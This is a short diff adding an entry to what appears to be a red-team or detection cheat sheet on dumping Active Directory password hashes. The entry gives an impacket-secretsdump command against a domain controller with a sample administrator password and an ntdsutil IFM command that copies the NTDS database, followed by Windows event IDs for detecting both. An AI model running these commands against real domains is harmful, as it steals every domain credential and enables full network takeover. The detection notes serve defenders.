@@ -21,3 +21,14 @@ tag: null
 
 ### Commands
 ```bash
+# ── Remote secretsdump ───────────────────────────────────────────────
+impacket-secretsdump corp.local/administrator:'Password123!'@10.10.10.5 -just-dc-ntds
+
+# ── On DC: ntdsutil IFM ──────────────────────────────────────────────
+ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ifm" quit quit
+```
+
+### Detection
+VSS creation (**8222**), `ntdsutil` execution (**4688**), **4662** mass reads; Tier-0 DC access control.
+
+---
